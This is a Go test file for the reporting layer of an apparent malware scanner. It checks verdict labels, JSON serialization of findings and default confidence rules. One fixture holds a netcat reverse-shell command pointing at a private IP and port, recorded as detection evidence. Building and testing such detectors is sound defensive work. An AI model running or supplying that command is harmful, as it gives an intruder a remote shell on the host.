package report_test

import (
	"encoding/json"
	"testing"
	"time"

	"aether/internal/report"
)

func TestVerdict_String(t *testing.T) {
	tests := []struct {
		v        report.Verdict
		expected string
	}{
		{report.VerdictMalicious, "MALICIOUS"},
		{report.VerdictSuspicious, "SUSPICIOUS"},
		{report.VerdictSafe, "SAFE"},
		{report.VerdictUnknown, "UNKNOWN"},
	}

	for _, tt := range tests {
		if got := tt.v.String(); got != tt.expected {
			t.Errorf("Verdict.String() = %q, want %q", got, tt.expected)
		}
	}
}

func TestEvidenceStrength_String(t *testing.T) {
	tests := []struct {
		s        report.EvidenceStrength
		expected string
	}{
		{report.StrengthDirect, "DIRECT"},
		{report.StrengthCorroborated, "CORROBORATED"},
		{report.StrengthContextual, "CONTEXTUAL"},
		{report.StrengthIncomplete, "INCOMPLETE"},
	}

	for _, tt := range tests {
		if got := tt.s.String(); got != tt.expected {
			t.Errorf("EvidenceStrength.String() = %q, want %q", got, tt.expected)
		}
	}
}

func TestFinding_JSONSerialization(t *testing.T) {
	now := time.Date(2026, 10, 3, 20, 0, 0, 0, time.UTC)
	f := report.Finding{
		ID:                  "finding-123",
		Timestamp:           now,
		Module:              "scanner",
		Severity:            report.SeverityAlert,
		Confidence:          report.ConfidenceHigh,
		Verdict:             report.VerdictMalicious,
		Title:               "Interactive Reverse Shell Script",
		Path:                "/tmp/rev.sh",
		LineNumber:          10,
		Reason:              "Reverse shell socket redirection detected",
		RuleName:            "Script_ReverseShell_Netcat",
		Why:                 "Automated outbound socket redirection",
		Remediation:         []string{"Quarantine file"},
		ConfidenceRationale: "Direct strong evidence match on unowned executable",
		EvidenceRecord: &report.EvidenceRecord{
			DetectorType:        "heuristic",
			RuleName:            "Script_ReverseShell_Netcat",
			EvidenceStrength:    report.StrengthDirect,
			MatchedCondition:    "nc -e /bin/sh",
			LineContent:         "nc -e /bin/bash 10.0.0.1 4444",
			LineNumber:          10,
			TargetPath:          "/tmp/rev.sh",
			SHA256:              "abcdef1234567890",
			FileMode:            0755,
			OwnerUID:            1000,
			PackageName:         "",
			PackageStatus:       "unowned",
			ContextProfile:      "standard",
			ConfidenceRationale: "Direct high-confidence reverse shell signature",
		},
	}

	data, err := json.Marshal(f)
	if err != nil {
		t.Fatalf("json.Marshal failed: %v", err)
	}

	var unmarshaled report.Finding
	if err := json.Unmarshal(data, &unmarshaled); err != nil {
		t.Fatalf("json.Unmarshal failed: %v", err)
	}

	if unmarshaled.Verdict != report.VerdictMalicious {
		t.Errorf("unmarshaled Verdict = %v, want %v", unmarshaled.Verdict, report.VerdictMalicious)
	}
	if unmarshaled.EvidenceRecord == nil {
		t.Fatal("unmarshaled EvidenceRecord is nil")
	}
	if unmarshaled.EvidenceRecord.EvidenceStrength != report.StrengthDirect {
		t.Errorf("unmarshaled EvidenceStrength = %v, want %v", unmarshaled.EvidenceRecord.EvidenceStrength, report.StrengthDirect)
	}
	if unmarshaled.EvidenceRecord.PackageStatus != "unowned" {
		t.Errorf("unmarshaled PackageStatus = %v, want unowned", unmarshaled.EvidenceRecord.PackageStatus)
	}
}

func TestFinding_DefaultVerdictAndRationale(t *testing.T) {
	// Confirmed direct signature gets ConfidenceHigh
	alertFinding := report.NewFinding("scanner", report.SeverityAlert, "/path/to/threat", "Alert reason", "Script_Reverse_Shell_Interactive")
	if alertFinding.Verdict != report.VerdictMalicious {
		t.Errorf("expected VerdictMalicious for ALERT, got %v", alertFinding.Verdict)
	}
	if alertFinding.Confidence != report.ConfidenceHigh {
		t.Errorf("expected ConfidenceHigh for confirmed reverse shell rule, got %v", alertFinding.Confidence)
	}
	if alertFinding.ConfidenceRationale == "" {
		t.Error("expected non-empty ConfidenceRationale")
	}

	// Generic unknown alert rule defaults to ConfidenceMedium (not blindly elevated to High)
	genericAlert := report.NewFinding("scanner", report.SeverityAlert, "/path/to/threat", "Alert reason", "Generic_Threat")
	if genericAlert.Confidence != report.ConfidenceMedium {
		t.Errorf("expected ConfidenceMedium for generic alert rule, got %v", genericAlert.Confidence)
	}

	warnFinding := report.NewFinding("scanner", report.SeverityWarning, "/path/to/warn", "Warn reason", "Generic_Warn")
	if warnFinding.Verdict != report.VerdictSuspicious {
		t.Errorf("expected VerdictSuspicious for WARNING, got %v", warnFinding.Verdict)
	}
	if warnFinding.Confidence != report.ConfidenceMedium {
		t.Errorf("expected ConfidenceMedium for WARNING, got %v", warnFinding.Confidence)
	}

	noticeFinding := report.NewFinding("scanner", report.SeverityNotice, "/path/to/notice", "Notice reason", "Generic_Notice")
	if noticeFinding.Verdict != report.VerdictSafe {
		t.Errorf("expected VerdictSafe for NOTICE, got %v", noticeFinding.Verdict)
	}
}
